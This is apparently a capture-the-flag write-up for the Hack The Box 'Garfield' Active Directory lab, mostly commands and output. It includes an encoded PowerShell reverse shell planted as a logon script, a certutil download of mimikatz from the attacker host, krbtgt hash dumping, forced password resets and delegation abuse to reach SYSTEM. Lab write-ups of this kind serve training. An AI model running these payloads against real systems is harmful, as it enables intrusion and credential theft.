---
tags:
title: Garfield - Hard (HTB)
permalink: /Garfield-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
As is common in real life pentests, you will start the Garfield box with credentials for the following account j.arbuckle / Th1sD4mnC4t!@1978
```

```bash 
zs1n@ptw ~> nmapf 10.129.24.143
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 13:01 -0400
Initiating Ping Scan at 13:01
Scanning 10.129.24.143 [4 ports]
Completed Ping Scan at 13:01, 0.50s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:01
Completed Parallel DNS resolution of 1 host. at 13:01, 0.50s elapsed
Initiating SYN Stealth Scan at 13:01
Scanning 10.129.24.143 [65535 ports]
Discovered open port 53/tcp on 10.129.24.143
Discovered open port 3389/tcp on 10.129.24.143
Discovered open port 139/tcp on 10.129.24.143
Discovered open port 445/tcp on 10.129.24.143
Discovered open port 135/tcp on 10.129.24.143
Discovered open port 49671/tcp on 10.129.24.143
Discovered open port 3268/tcp on 10.129.24.143
Discovered open port 49667/tcp on 10.129.24.143
Discovered open port 3268/tcp on 10.129.24.143
Discovered open port 49674/tcp on 10.129.24.143
Discovered open port 49899/tcp on 10.129.24.143
Discovered open port 49674/tcp on 10.129.24.143
Discovered open port 88/tcp on 10.129.24.143
Discovered open port 3268/tcp on 10.129.24.143
Discovered open port 9389/tcp on 10.129.24.143
Discovered open port 49983/tcp on 10.129.24.143
Discovered open port 2179/tcp on 10.129.24.143
Discovered open port 636/tcp on 10.129.24.143
Discovered open port 593/tcp on 10.129.24.143
Increasing send delay for 10.129.24.143 from 0 to 5 due to 11 out of 27 dropped probes since last increase.
Discovered open port 5985/tcp on 10.129.24.143
Discovered open port 389/tcp on 10.129.24.143
Discovered open port 5985/tcp on 10.129.24.143
Discovered open port 49670/tcp on 10.129.24.143
Discovered open port 464/tcp on 10.129.24.143
Discovered open port 49673/tcp on 10.129.24.143
Discovered open port 3269/tcp on 10.129.24.143
Completed SYN Stealth Scan at 13:01, 36.08s elapsed (65535 total ports)
Nmap scan report for 10.129.24.143
Host is up, received echo-reply ttl 127 (0.43s latency).
Scanned at 2026-04-06 13:01:09 EDT for 36s
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49899/tcp open  unknown          syn-ack ttl 127
49983/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 37.21 seconds
           Raw packets sent: 327625 (14.415MB) | Rcvd: 70 (3.969KB)
-e [*] IP: 10.129.24.143
[*] Puertos abiertos: 53,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5985,9389,49667,49670,49671,49673,49674,49899,49983
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,88,135,139,389,445,464,593,636,2179,3268,3269,3389,5985,9389,49667,49670,49671,49673,49674,49899,49983 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 13:01 -0400
Nmap scan report for 10.129.24.143
Host is up (0.81s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-07 01:01:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Not valid before: 2026-02-13T01:10:36
|_Not valid after:  2026-08-15T01:10:36
| rdp-ntlm-info:
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-07T01:03:03+00:00
|_ssl-date: 2026-04-07T01:03:43+00:00; +8h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49899/tcp open  msrpc         Microsoft Windows RPC
49983/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-04-07T01:03:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.58 seconds
```

```bash
nxc smb 10.129.244.207 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
SMB         10.129.244.207  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.207  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
```

```bash
[Apr 17, 2026 - 01:29:06 (-03)] exegol-test Garfield # smbclient.py garfield.htb/j.arbuckle:'Th1sD4mnC4t!@1978'@DC01.garfield.htb -dc-ip 10.129.244.207
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
# use sysvol
# ls
drw-rw-rw-          0  Wed Aug 13 08:04:51 2025 .
drw-rw-rw-          0  Wed Aug 13 08:04:51 2025 ..
drw-rw-rw-          0  Wed Aug 13 08:04:51 2025 garfield.htb
# cd garfield.htb
ls
# ls
drw-rw-rw-          0  Wed Aug 13 08:11:04 2025 .
drw-rw-rw-          0  Wed Aug 13 08:11:04 2025 ..
drw-rw-rw-          0  Fri Apr 17 09:29:32 2026 DfsrPrivate
drw-rw-rw-          0  Wed Aug 13 08:04:51 2025 Policies
drw-rw-rw-          0  Tue Jan 27 19:13:47 2026 scripts
# cd scripts
ls
# ls
drw-rw-rw-          0  Tue Jan 27 19:13:47 2026 .
drw-rw-rw-          0  Tue Jan 27 19:13:47 2026 ..
-rw-rw-rw-        217  Fri Sep 12 19:25:38 2025 printerDetect.bat
```


```bash
cat shell.ps1
@echo off
powershell -ec JABUAGEAcgBnAGUAdABIAG8AcwB0ACAAPQAgACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAxADQAIgA7AAoAJABUAGEAcgBnAGUAdABQAG8AcgB0ACAAPQAgADQANAA0ADQAOwAKACQAQwBvAG0AbQBhAG4AZABFAHgAZQBjACAAPQAgACIAcABvAHcAZQByAHMAaABlAGwAbAAiAAoAJABDAG8AbQBtAGEAbgBkAEEAcgBnAHMAIAA9ACAAIgAiAAoAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAdABvAHAAIgA7AAoAdAByAHkAewAKACQAQwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAOwAKACQAQwBsAGkAZQBuAHQALgBDAG8AbgBuAGUAYwB0ACgAJABUAGEAcgBnAGUAdABIAG8AcwB0ACwAIAAkAFQAYQByAGcAZQB0AFAAbwByAHQAKQA7AAoAJABTAHQAcgBlAGEAbQAgAD0AIAAkAEMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAQwBvAG4AbgBlAGMAdABlAGQAIQAiAAoAJABQAHIAbwBjAGUAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAOwAKACQAUAByAG8AYwBlAHMAcwAuAFMAdABhAHIAdABJAG4AZgBvAC4ARgBpAGwAZQBOAGEAbQBlACAAPQAgACQAQwBvAG0AbQBhAG4AZABFAHgAZQBjAAoAJABQAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBBAHIAZwB1AG0AZQBuAHQAcwAgAD0AIAAkAEMAbwBtAG0AYQBuAGQAQQByAGcAcwAKACQAUAByAG8AYwBlAHMAcwAuAFMAdABhAHIAdABJAG4AZgBvAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAAgAD0AIAAkAHQAcgB1AGUAOwAKACQAUAByAG8AYwBlAHMAcwAuAFMAdABhAHIAdABJAG4AZgBvAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABJAG4AcAB1AHQAIAA9ACAAJAB0AHIAdQBlADsACgAkAFAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQASQBuAGYAbwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlACAAPQAgACQAZgBhAGwAcwBlADsACgAkAFAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQAKAApACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AAoAJABDAGgAYQByAEIAdQBmACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABDAGgAYQByAFsAXQAgADYANQA1ADMANgA7AAoAJABCAHkAdABlAEIAdQBmACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADYANQA1ADMANgA7AAoARgB1AG4AYwB0AGkAbwBuACAAUgBlAGEAZABTAHQAcgBlAGEAbQB7ACAAJABTAHQAcgBlAGEAbQAuAFIAZQBhAGQAQQBzAHkAbgBjACgAJABCAHkAdABlAEIAdQBmACwAIAAwACAALAA2ADUANQAzADAAKQAgAH0ACgBGAHUAbgBjAHQAaQBvAG4AIABSAGUAYQBkAFMAdABkAG8AdQB0AHsAIAAkAFAAcgBvAGMAZQBzAHMALgBTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQALgBSAGUAYQBkAEEAcwB5AG4AYwAoACQAQwBoAGEAcgBCAHUAZgAsACAAMAAsACAANgA1ADUAMwA1ACkAIAB9AAoAJABUADEAIAA9ACAAUgBlAGEAZABTAHQAcgBlAGEAbQAKACQAVAAyACAAPQAgAFIAZQBhAGQAUwB0AGQAbwB1AHQACgB3AGgAaQBsAGUAKAAkAHQAcgB1AGUAKQB7AAoAJABUACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGgAcgBlAGEAZABpAG4AZwAuAFQAYQBzAGsAcwAuAFQAYQBzAGsAXQA6ADoAVwBhAGkAdABBAG4AeQAoACQAVAAxACwAIAAkAFQAMgApAAoAaQBmACgAJABUACAALQBlAHEAIAAwACkAewAKAGkAZgAoACgAJABOACAAPQAgACQAVAAxAC4AUgBlAHMAdQBsAHQAKQAgAC0AZQBxACAAMAApAHsAIAB0AGgAcgBvAHcAIAAiAFMAbwBjAGsAZQB0ACAARQBPAEYALgAiADsAIAB9AAoAdwBoAGkAbABlACgAJABCAHkAdABlAEIAdQBmAFsAJAAoACQATgAtADEAKQBdACAALQBiAGEAbgBkACAAMAB4ADgAMAApAHsACgBpAGYAKAAkAFMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAQgB5AHQAZQBCAHUAZgAsACAAJABOACsAKwAsACAAMQApACAALQBlAHEAIAAwACkAewAKAHQAaAByAG8AdwAgACIAUwBvAGMAawBlAHQAIABFAE8ARgAuACIACgB9AAoAfQAKACQAUwB0AHIAaQBuAGcAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABCAHkAdABlAEIAdQBmAFsAMAAuAC4AJAAoACQATgAtADEAKQBdACkACgAkAFAAcgBvAGMAZQBzAHMALgBTAHQAYQBuAGQAYQByAGQASQBuAHAAdQB0AC4AVwByAGkAdABlACgAJABTAHQAcgBpAG4AZwApADsACgAkAFQAMQAgAD0AIABSAGUAYQBkAFMAdAByAGUAYQBtAAoAfQBlAGwAcwBlAHsACgBpAGYAKAAoACQATgAgAD0AIAAkAFQAMgAuAFIAZQBzAHUAbAB0ACkAIAAtAGUAcQAgADAAKQB7ACAAdABoAHIAbwB3ACAAIgBQAHIAbwBjAGUAcwBzACAARQBPAEYALgAiADsAIAB9AAoAJABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACQAQwBoAGEAcgBCAHUAZgAsACAAMAAsACAAJABOACkACgAkAFMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABCAHkAdABlAHMALAAgADAALAAgACQAQgB5AHQAZQBzAC4AQwBvAHUAbgB0ACkAOwAKACQAVAAyACAAPQAgAFIAZQBhAGQAUwB0AGQAbwB1AHQACgB9AAoAfQAKAH0AYwBhAHQAYwBoAHsACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACQAXwAuAFQAbwBTAHQAcgBpAG4AZwAoACkACgB9AGYAaQBuAGEAbABsAHkAewAKAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgBTAGgAdQB0AHQAaQBuAGcAIABkAG8AdwBuAC4AIgAKAHQAcgB5AHsAIAAkAEMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAgAH0AYwBhAHQAYwBoAHsAIAB9AAoAdAByAHkAewAgACQAUAByAG8AYwBlAHMAcwAuAEsAaQBsAGwAKAApACAAfQBjAGEAdABjAGgAewAgAH0ACgB9AAoA

```

```bash
# put printerDetect.bat
```

```bash
bloodyAD --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable --detail

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
scriptPath: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
```

```bash
bloodyAD --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

```powershell
 rlwrap nc -lvnp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:46470.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
garfield\l.wilson
```


![[Pasted image 20260406144500.png]]


https://www.thehacker.recipes/ad/movement/builtins/rodc

```powershell
PS C:\users\l.wilson\desktop> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\users\l.wilson\desktop> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force; Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $SecPassword -Reset
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
PS C:\users\l.wilson\desktop> Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $SecPassword -Reset
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $SecPassword -Reset
```

```bash
zs1n@ptw ~> nxc smb garfield.htb -u l.wilson_adm -p 'Password123!'
SMB         10.129.24.143   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.24.143   445    DC01             [+] garfield.htb\l.wilson_adm:Password123!
```

```bash
zs1n@ptw ~> net rpc password "RODC01$" "newP@ssword2022" -U "garfield.htb"/"l.wilson_adm"%'Password123!' -S "10.129.244.207"
```

```bash
zs1n@ptw ~> nxc smb garfield.htb -u 'RODC01$' -p 'newP@ssword2022'
SMB         10.129.244.207   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.207   445    DC01             [+] garfield.htb\RODC01$:newP@ssword2022
```

```bash
nxc ldap 10.129.244.207 -u l.wilson_adm -p 'Password123!' -M maq
LDAP        10.129.244.207  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.244.207  389    DC01             [+] garfield.htb\l.wilson_adm:Password123!
MAQ         10.129.244.207  389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.129.244.207  389    DC01             MachineAccountQuota: 10
```
 creo computadora
```bash
bloodyAD --host garfield.htb -u l.wilson_adm -p 'Password123!' add computer 'zsln' 'zsln123!$'
[+] zsln$ created
```

doy permiso de delegacion 

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount zsln$
```

```bash
proxychains getST.py -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -dc-ip 192.168.100.2 'garfield.htb/zsln$:zsln123!$'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:88  ...  OK
[*] Impersonating Administrator
[*] Requesting S4U2self
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:88  ...  OK
[*] Requesting S4U2Proxy
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.2:88  ...  OK
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

Exporto variable para el ccache

```bash
[Apr 17, 2026 - 10:35:33 (-03)] exegol-htb_priv Garfield # export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

Shell como system en RODC01

```powershell
[Apr 17, 2026 - 11:25:14 (-03)] exegol-htb_priv Garfield # KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache proxychains psexec.py -k -no-pass RODC01.garfield.htb
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  RODC01.garfield.htb:445  ...  OK
[*] Requesting shares on RODC01.garfield.htb.....
[*] Found writable share ADMIN$
[*] Uploading file cZeOMZIC.exe
[*] Opening SVCManager on RODC01.garfield.htb.....
[*] Creating service Mcdn on RODC01.garfield.htb.....
[*] Starting service Mcdn.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  RODC01.garfield.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  RODC01.garfield.htb:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  RODC01.garfield.htb:445  ...  OK
Microsoft Windows [Version 10.0.17763.8511]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

```powershell
C:\ProgramData> certutil -urlcache -split -f http://10.10.16.214/mimikatz.exe ./mk.exe **** Online **** 000000 ... 14afa0 CertUtil: -URLCache command completed successfully.
```

```powershell
C:\ProgramData> .\mk.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::lsa /inject /name:krbtgt_8245
Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2
    LM   :
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

 * WDigest
    01  6d31d1f92ef6d85f5517944f98bf5753
    02  8c46bd5ddc680291e70800990dbc02e3
    03  9ffbc24f29b9bb3df3c32b76631ff874
    04  6d31d1f92ef6d85f5517944f98bf5753
    05  8c46bd5ddc680291e70800990dbc02e3
    06  8fc97c500bf9c7c4a0d34a497f9c5245
    07  6d31d1f92ef6d85f5517944f98bf5753
    08  c4bac61b7ecb407d358f836d2f4e19c6
    09  c4bac61b7ecb407d358f836d2f4e19c6
    10  d8938c80e1e0c80a2ec1d8b06f42cb31
    11  67f002aa49f4400fa970a53e294f4bee
    12  c4bac61b7ecb407d358f836d2f4e19c6
    13  56062e2db43bc0069deb86de87509ca6
    14  67f002aa49f4400fa970a53e294f4bee
    15  7250fcfc09d9cb93345c0c1393e19e52
    16  7250fcfc09d9cb93345c0c1393e19e52
    17  04b30cd8b5381d4b8458b0c996503a91
    18  b48bda9ef98982d5ee33766a74880e01
    19  bb365cf4f0bcdadf35b6a9b04c58257b
    20  85addbd6d603cca1b500f2da02b205d0
    21  b6186618611e202aae4141716e6603f5
    22  b6186618611e202aae4141716e6603f5
    23  f3f6c9408db132bf8e59413b7b40bb16
    24  0acf88cc5cb3b35888708ebefe658b6f
    25  0acf88cc5cb3b35888708ebefe658b6f
    26  08b8941632a5017e7178a3761dfaf7fb
    27  c1b2fd89d0dafb5f9e18147042bdc433
    28  712f0b6ed3b7eb7f6f135a1e298c4e09
    29  bf8d51270f7f657079bb9744446d70cb

 * Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

 * NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b

mimikatz(commandline) # exit
```


```powershell
zs1n@ptw ~> evil-winrm -i garfield.htb -u l.wilson_adm -p 'Password123!'

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> type ../desktop/user.txt
3dc263b13cdd9214aca9c835911c6a3e
```

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> arp -a

Interface: 10.129.244.207 --- 0x7
  Internet Address      Physical Address      Type
  10.129.0.1            00-50-56-b0-a3-d9     dynamic
  10.129.29.118         00-50-56-b0-46-98     dynamic
  10.129.244.72         00-50-56-b0-cd-d2     dynamic
  10.129.255.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.100.1 --- 0x9
  Internet Address      Physical Address      Type
  192.168.100.2         00-15-5d-0b-dd-01     dynamic
  192.168.100.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
```

![[Pasted image 20260406150928.png]]

```bash
zs1n@ptw ~> bloodyAD --host garfield.htb -u 'l.wilson_adm' -p 'Password123!' add groupMember 'RODC Administrators' 'l.wilson_adm'
[+] l.wilson_adm added to RODC Administrators
```

```bash
zs1n@ptw ~> python3 powerview.py "garfield.htb"/"l.wilson_adm":'Password123!'@"DC01.garfield.htb"
```

```powershell
Set-DomainObject -Identity RODC01$ -Set msDS-RevealOnDemandGroup='CN=Administrator,CN=Users,DC=garfield,DC=htb'
Set-DomainObject -Identity RODC-server$ -Append msDS-RevealOnDemandGroup='CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb'

